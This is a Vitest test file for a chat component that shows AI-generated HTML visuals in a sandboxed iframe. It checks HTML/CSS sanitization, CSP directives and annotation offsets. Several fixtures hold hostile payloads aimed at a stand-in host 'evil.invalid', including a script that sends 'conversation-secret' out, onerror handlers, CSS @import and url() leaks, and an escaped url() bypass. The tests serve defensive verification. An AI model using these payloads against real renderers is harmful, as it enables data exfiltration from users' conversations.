// @vitest-environment jsdom

import { ThemeProvider } from "@/context/ThemeContext";
import {
  CHAT_ANNOTATION_BLOCK_ATTRIBUTE,
  CHAT_ANNOTATION_SOURCE_ATTRIBUTE,
  resolveChatAnnotationRange,
  restoreChatAnnotationRange,
} from "@/lib/chat-response-annotation-selection";
import type { ChatMessage } from "@rudderhq/shared";
import fs from "node:fs";
import path from "node:path";
import type { ReactNode } from "react";
import { act } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  buildInlineVisualSrcDoc,
  ChatInlineVisualContent,
  clampInlineVisualHeight,
  INLINE_VISUAL_CSP,
} from "./ChatInlineVisual";

vi.mock("@/context/MarkdownMentionsContext", () => ({
  useMarkdownMentions: () => ({ mentions: [], onMentionQueryChange: () => undefined }),
}));

(globalThis as typeof globalThis & { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
Object.defineProperty(window, "matchMedia", {
  writable: true,
  value: vi.fn().mockImplementation((query: string) => ({
    matches: false,
    media: query,
    addEventListener: vi.fn(),
    removeEventListener: vi.fn(),
  })),
});

function message(overrides: Partial<ChatMessage> = {}): ChatMessage {
  return {
    id: "message-1",
    orgId: "org-1",
    conversationId: "chat-1",
    role: "assistant",
    kind: "message",
    status: "completed",
    body: 'Chart below\n::codex-inline-vis{file="chart.html"}',
    structuredPayload: {
      inlineVisuals: [{
        directiveIndex: 0,
        file: "chart.html",
        status: "ready",
        attachmentId: "attachment-1",
      }],
    },
    approvalId: null,
    approval: null,
    attachments: [{
      id: "attachment-1",
      orgId: "org-1",
      conversationId: "chat-1",
      messageId: "message-1",
      assetId: "asset-1",
      contentType: "text/html",
      byteSize: 100,
      sha256: "sha",
      originalFilename: "chart.html",
      createdByAgentId: "agent-1",
      createdByUserId: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      contentPath: "/api/assets/asset-1/content",
    }],
    replyingAgentId: "agent-1",
    chatTurnId: "turn-1",
    turnVariant: 0,
    supersededAt: null,
    createdAt: new Date(),
    updatedAt: new Date(),
    ...overrides,
  };
}

function renderVisual(messageToRender: ChatMessage) {
  return render(
    <ThemeProvider>
      <ChatInlineVisualContent message={messageToRender} />
    </ThemeProvider>,
  );
}

let cleanupFn: (() => void) | null = null;

function render(element: ReactNode) {
  const container = document.createElement("div");
  document.body.appendChild(container);
  const root = createRoot(container);
  act(() => { root.render(element); });
  cleanupFn = () => act(() => root.unmount());
  return container;
}

async function waitFor(assertion: () => void) {
  let lastError: unknown;
  for (let attempt = 0; attempt < 30; attempt += 1) {
    await act(async () => { await new Promise((resolve) => setTimeout(resolve, 0)); });
    try {
      assertion();
      return;
    } catch (error) {
      lastError = error;
    }
  }
  throw lastError;
}

function elementWithExactText(container: HTMLElement, text: string) {
  return [...container.querySelectorAll<HTMLElement>("*")].find((element) => element.textContent === text) ?? null;
}

afterEach(() => {
  cleanupFn?.();
  cleanupFn = null;
  document.body.innerHTML = "";
  vi.unstubAllGlobals();
  localStorage.clear();
});

describe("ChatInlineVisualContent", () => {
  it("keeps full-message raw offsets before and after a visual while rejecting a crossing range", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => new Response(
      '<div id="widget"><p>Chart</p></div>',
      { status: 200 },
    )));
    const body = [
      "Before **alpha**.",
      '::codex-inline-vis{file="chart.html"}',
      "After [beta](https://example.com).",
    ].join("\n\n");
    const view = renderVisual(message({ body }));
    await waitFor(() => expect(view.querySelector("iframe")).not.toBeNull());
    const sourceRoot = view.firstElementChild as HTMLElement;
    sourceRoot.setAttribute(CHAT_ANNOTATION_SOURCE_ATTRIBUTE, "assistant:message-1");
    sourceRoot.setAttribute(CHAT_ANNOTATION_BLOCK_ATTRIBUTE, "message-1");
    const alpha = sourceRoot.querySelector("strong")!.firstChild!;
    const beta = sourceRoot.querySelector<HTMLAnchorElement>(
      'a[href="https://example.com"]',
    )!.querySelector(".rudder-website-link-label")!.firstChild!;

    const beforeRange = document.createRange();
    beforeRange.setStart(alpha, 0);
    beforeRange.setEnd(alpha, "alpha".length);
    expect(resolveChatAnnotationRange({
      range: beforeRange,
      sourceRoot,
      source: body,
      sourceHash: "b".repeat(64),
      sourceConversationId: "10000000-0000-4000-8000-000000000001",
      sourceMessageId: "20000000-0000-4000-8000-000000000001",
      surface: "assistant_body",
    })).toMatchObject({
      selectedText: "alpha",
      start: body.indexOf("alpha"),
      end: body.indexOf("alpha") + "alpha".length,
    });

    const afterRange = document.createRange();
    afterRange.setStart(beta, 0);
    afterRange.setEnd(beta, "beta".length);
    expect(resolveChatAnnotationRange({
      range: afterRange,
      sourceRoot,
      source: body,
      sourceHash: "b".repeat(64),
      sourceConversationId: "10000000-0000-4000-8000-000000000001",
      sourceMessageId: "20000000-0000-4000-8000-000000000001",
      surface: "assistant_body",
    })).toMatchObject({
      selectedText: "beta",
      start: body.indexOf("beta"),
      end: body.indexOf("beta") + "beta".length,
    });

    const restored = restoreChatAnnotationRange({
      sourceRoot,
      source: body,
      start: body.indexOf("beta"),
      end: body.indexOf("beta") + "beta".length,
    });
    expect(restored?.startContainer).toBe(beta);
    expect(restored?.endContainer).toBe(beta);

    const crossingRange = document.createRange();
    crossingRange.setStart(alpha, 0);
    crossingRange.setEnd(beta, "beta".length);
    expect(resolveChatAnnotationRange({
      range: crossingRange,
      sourceRoot,
      source: body,
      sourceHash: "b".repeat(64),
      sourceConversationId: "10000000-0000-4000-8000-000000000001",
      sourceMessageId: "20000000-0000-4000-8000-000000000001",
      surface: "assistant_body",
    })).toBeNull();
  });

  it("renders the bundled Rudder visualize example through the production sanitizer", () => {
    const example = fs.readFileSync(
      path.join(process.cwd(), "server/resources/bundled-skills/visualize/assets/example-chart.html"),
      "utf8",
    );
    const srcdoc = buildInlineVisualSrcDoc(example, "light");
    const parsed = new DOMParser().parseFromString(srcdoc, "text/html");
    const runtimeCss = parsed.querySelector("style")?.textContent ?? "";

    expect(parsed.querySelector("#widget")).not.toBeNull();
    expect(parsed.querySelector('svg[role="img"]')).not.toBeNull();
    expect(parsed.querySelector('svg[role="img"]')?.getAttribute("aria-label")).toBeTruthy();
    expect(parsed.querySelector("details > summary[data-tooltip]")).not.toBeNull();
    expect(parsed.querySelector("script, a, button, form, input, img")).toBeNull();
    expect(srcdoc).toContain(".example-chart-bar:nth-child(4)");
    expect(srcdoc).toContain("height:118px");
    expect(srcdoc).not.toMatch(/https?:\/\//);
    expect(runtimeCss).not.toMatch(/\.btn|\.form-|\[data-lucide\]/);
  });

  it("hides the mapped directive and renders a declarative, scriptless visual in an isolated iframe", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => new Response([
      '<div id="widget">',
      '<details><summary class="btn" data-tooltip="Show details">Details</summary><p>Safe content</p></details>',
      '<svg role="img" aria-label="Completed runs chart" viewBox="0 0 100 40"><path fill="var(--viz-series-1)" d="M0 0h40v40H0z"/></svg>',
      "</div>",
      "<script>location.href='https://evil.invalid/leak?data=conversation-secret'</script>",
    ].join(""), { status: 200, headers: { "Content-Type": "text/html" } })));

    const view = renderVisual(message());
    await waitFor(() => expect(view.querySelector("iframe")).not.toBeNull());
    const iframe = view.querySelector("iframe")!;
    const srcdoc = iframe.getAttribute("srcdoc") ?? "";

    expect(view.textContent).toContain("Chart below");
    expect(view.textContent).not.toContain("::codex-inline-vis");
    expect(iframe.getAttribute("sandbox")).toBe("allow-same-origin");
    expect(iframe.getAttribute("sandbox")).not.toContain("allow-scripts");
    expect(iframe.getAttribute("csp")).toBe(INLINE_VISUAL_CSP);
    expect(iframe.hasAttribute("credentialless")).toBe(true);
    expect(iframe.getAttribute("referrerpolicy")).toBe("no-referrer");
    expect(srcdoc).toContain(INLINE_VISUAL_CSP);
    expect(srcdoc).toContain("default-src 'none'");
    expect(srcdoc).toContain("script-src 'none'");
    expect(srcdoc).toContain("connect-src 'none'");
    expect(srcdoc).toContain("form-action 'none'");
    expect(srcdoc).toContain("frame-src 'none'");
    expect(srcdoc).toContain("object-src 'none'");
    expect(srcdoc).toContain("base-uri 'none'");
    expect(srcdoc).not.toContain("<script");
    expect(srcdoc).not.toContain("evil.invalid");
    expect(srcdoc).not.toContain("unpkg.com");
    expect(srcdoc).not.toContain("cdnjs.cloudflare.com");
    expect(srcdoc).not.toContain("esm.sh");
    expect(srcdoc).not.toContain("cdn.jsdelivr.net");
    expect(srcdoc).toContain("<details>");
    expect(srcdoc).toContain("<svg");
    expect(srcdoc).toContain("--viz-series-6");
    expect(srcdoc).toContain(".viz-controls");
    expect(srcdoc).toContain("data-tooltip");
    expect(srcdoc).toContain("data-theme=\"light\"");
    expect(srcdoc).not.toContain("window.openai");
  });

  it("renders the provider-neutral canonical placement with a trusted v1 mapping", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => new Response('<div id="widget">Runtime neutral</div>', { status: 200 })));
    const base = message();
    const view = renderVisual(message({
      body: 'Capacity\n::rudder-inline-vis{slot="0"}',
      structuredPayload: {
        inlineVisualsV1: [{
          version: 1,
          slot: 0,
          file: "inline-visual-1.html",
          status: "ready",
          attachmentId: "attachment-1",
          contentType: "text/html",
          byteSize: 100,
          sha256: "a".repeat(64),
        }],
      },
      attachments: base.attachments.map((attachment) => ({
        ...attachment,
        originalFilename: "inline-visual-1.html",
        sha256: "a".repeat(64),
      })),
    }));

    await waitFor(() => expect(view.querySelector("iframe")).not.toBeNull());
    expect(view.textContent).toContain("Capacity");
    expect(view.textContent).not.toContain("::rudder-inline-vis");
  });

  it("removes every active or network-capable construct while preserving safe HTML and SVG", () => {
    const srcdoc = buildInlineVisualSrcDoc([
      '<meta http-equiv="refresh" content="0;url=https://evil.invalid">',
      '<base href="https://evil.invalid/">',
      '<script>location.href="https://evil.invalid/script"</script>',
      '<style>@import url("https://evil.invalid/style");</style>',
      '<link rel="stylesheet" href="https://evil.invalid/link.css">',
      '<img src="https://evil.invalid/image" onerror="alert(1)">',
      '<iframe src="https://evil.invalid/frame"></iframe>',
      '<object data="https://evil.invalid/object"></object>',
      '<embed src="https://evil.invalid/embed">',
      '<form action="https://evil.invalid/form"><button formaction="https://evil.invalid/button">Send</button></form>',
      '<a href="https://evil.invalid/link">External link</a>',
      '<div id="widget" class="card viz-grid" style="background:url(https://evil.invalid/css)" onclick="alert(1)">',
      '<details open><summary data-tooltip="Safe tooltip">Details</summary><p>Safe content</p></details>',
      '<svg role="img" aria-label="Safe chart" aria-owns="forbidden-relationship" viewBox="0 0 10 10"><clipPath id="unsafe-clip"><rect width="10" height="10"/></clipPath><foreignObject><img src="https://evil.invalid/svg-image"></foreignObject><use href="https://evil.invalid/use.svg#shape"/><animate attributeName="opacity" values="0;1"/><animateMotion path="M0 0L10 10"/><animateTransform attributeName="transform" type="rotate"/><circle cx="5" cy="5" r="4" fill="url(https://evil.invalid/paint)"/></svg>',
      '</div>',
    ].join(""), "light");
    const renderedBody = srcdoc.slice(srcdoc.indexOf("<body>"));
    expect(renderedBody).toContain('id="widget"');
    expect(renderedBody).toContain("Safe content");
    expect(renderedBody).toContain("<details");
    expect(renderedBody).toContain("data-tooltip=\"Safe tooltip\"");
    expect(renderedBody).toContain("<svg");
    expect(renderedBody).toContain('aria-label="Safe chart"');
    expect(renderedBody).not.toContain("aria-owns");
    expect(renderedBody).toContain("<circle");
    expect(renderedBody).not.toContain("evil.invalid");
    expect(renderedBody).not.toMatch(/<script|<style|<link|<img|<iframe|<object|<embed|<form|<a\b|<clipPath|<foreignObject|<use|<animate/i);
    expect(renderedBody).not.toMatch(/\s(?:on\w+|href|src|data|action|formaction|style)=/i);
    expect(renderedBody).not.toContain("url(");
    expect(renderedBody).not.toContain("javascript:");
    expect(renderedBody).not.toContain("data:text/html");
    expect(renderedBody).not.toContain("External link");
    expect(renderedBody).not.toContain("Send");
  });

  it("retains bounded safe artifact CSS while removing network-bearing and active CSS", () => {
    const srcdoc = buildInlineVisualSrcDoc([
      "<style>",
      ".artifact-card{color:rgb(12 34 56);display:grid;gap:7px;transform:translateX(2px);background:linear-gradient(90deg,var(--viz-series-1),rgb(255 255 255))}",
      "@media (max-width: 600px){.artifact-card{grid-template-columns:1fr 1fr}}",
      '@import url("https://evil.invalid/import.css");',
      '@font-face{font-family:evil;src:url("https://evil.invalid/font.woff2")}',
      '.ordinary-url{background-image:url("https://evil.invalid/image.png");color:red}',
      String.raw`.escaped-url{background-image:u\72l("https://evil.invalid/escaped.png");color:blue}`,
      ".custom-property{--leak:url(https://evil.invalid/custom.png);color:green}",
      ".active-css{content:'leak';cursor:url(https://evil.invalid/cursor.cur),auto;filter:blur(2px);clip-path:circle(20px);mask:none;behavior:url(https://evil.invalid/behavior.htc);-moz-binding:url(https://evil.invalid/binding.xml);src:url(https://evil.invalid/source);color:purple}",
      ".external-function{background-image:image-set('https://evil.invalid/set.png' 1x);color:orange}",
      "@namespace svg url(https://evil.invalid/namespace);",
      "@keyframes hostile{from{color:red}to{color:blue}}",
      "@property --hostile{syntax:'<color>';inherits:false;initial-value:red}",
      "</style>",
      '<div id="widget" class="artifact-card ordinary-url escaped-url custom-property active-css external-function">Safe content</div>',
    ].join(""), "light");
    const parsed = new DOMParser().parseFromString(srcdoc, "text/html");
    const artifactCss = [...parsed.querySelectorAll("style")].at(-1)?.textContent ?? "";

    expect(parsed.querySelectorAll("style")).toHaveLength(2);
    expect(artifactCss).toContain(".artifact-card");
    expect(artifactCss).toContain("color:rgb(12 34 56)");
    expect(artifactCss).toContain("display:grid");
    expect(artifactCss).toContain("linear-gradient(90deg,var(--viz-series-1),rgb(255 255 255))");
    expect(artifactCss).toContain("@media (max-width:600px)");
    expect(artifactCss).toContain("grid-template-columns:1fr 1fr");
    expect(artifactCss).not.toContain("evil.invalid");
    expect(artifactCss).not.toContain("@import");
    expect(artifactCss).not.toContain("@font-face");
    expect(artifactCss).not.toContain("@namespace");
    expect(artifactCss).not.toContain("@keyframes");
    expect(artifactCss).not.toContain("@property");
    expect(artifactCss).not.toContain("background-image");
    expect(artifactCss).not.toContain(String.raw`u\72l`);
    expect(artifactCss).not.toContain("--leak");
    expect(artifactCss).not.toMatch(/(?:content|cursor|filter|clip-path|mask|behavior|-moz-binding|src):/);
  });

  it("drops artifact stylesheets that exceed the rule limit", () => {
    const rules = Array.from({ length: 129 }, (_, index) => `.bounded-${index}{color:red}`).join("");
    const srcdoc = buildInlineVisualSrcDoc(`<style>${rules}</style><div class="bounded-0">Safe</div>`, "light");
    const parsed = new DOMParser().parseFromString(srcdoc, "text/html");

    expect(parsed.querySelectorAll("style")).toHaveLength(1);
    expect(srcdoc).not.toContain(".bounded-0{");
  });

  it.each([
    { label: "streaming", overrides: { status: "streaming" as const } },
    { label: "stopped", overrides: { status: "stopped" as const } },
    { label: "failed", overrides: { status: "failed" as const } },
    { label: "user", overrides: { role: "user" as const } },
  ])("does not execute $label messages", ({ overrides }) => {
    const fetchMock = vi.fn();
    vi.stubGlobal("fetch", fetchMock);
    const view = renderVisual(message(overrides));
    expect(view.querySelector("iframe")).toBeNull();
    if (overrides.role === "user") expect(view.textContent).toContain("::codex-inline-vis");
    else expect(view.textContent).not.toContain("::codex-inline-vis");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("rejects mappings to another message, non-HTML, or user-created attachments", () => {
    const fetchMock = vi.fn();
    vi.stubGlobal("fetch", fetchMock);
    const base = message();
    const view = renderVisual(message({
      attachments: base.attachments.map((attachment) => ({
        ...attachment,
        messageId: "message-other",
        contentType: "text/plain",
        createdByAgentId: null,
        createdByUserId: "user-1",
      })),
    }));
    expect(elementWithExactText(view, "Visual artifact unavailable")).toBeTruthy();
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("shows an unavailable fallback without exposing the internal source as a download", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => new Response("no", { status: 500 })));
    const view = renderVisual(message());
    await waitFor(() => expect(elementWithExactText(view, "Visual artifact unavailable")).toBeTruthy());
    expect(view.textContent).not.toContain("Download source");
    expect(view.querySelector("a")).toBeNull();
  });

  it("rerenders the runtime with the current Rudder theme", async () => {
    localStorage.setItem("rudder.theme", "dark");
    vi.stubGlobal("fetch", vi.fn(async () => new Response('<div id="widget">Dark</div>', { status: 200 })));
    const view = renderVisual(message());
    await waitFor(() => expect(view.querySelector("iframe")?.getAttribute("srcdoc")).toContain('data-theme="dark"'));
  });
});

describe("clampInlineVisualHeight", () => {
  it("accepts only finite measurements and clamps them", () => {
    expect(clampInlineVisualHeight(420)).toBe(420);
    expect(clampInlineVisualHeight(10)).toBe(120);
    expect(clampInlineVisualHeight(5000)).toBe(1200);
    expect(clampInlineVisualHeight("420")).toBeNull();
    expect(clampInlineVisualHeight(Number.NaN)).toBeNull();
  });
});
